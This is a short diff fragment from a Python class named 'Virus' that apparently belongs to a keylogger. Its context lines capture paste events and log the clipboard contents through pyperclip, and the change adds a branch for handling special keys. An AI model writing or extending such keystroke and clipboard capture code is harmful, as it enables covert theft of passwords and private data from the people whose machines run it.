@@ -98,3 +98,5 @@ class Virus(object):
 
                 if key.char.encode() == b"\x16":
                     self.append_text(f"\x00<^paste: {pyperclip.paste()}>\x00")
+
+            elif type(key) == Key:
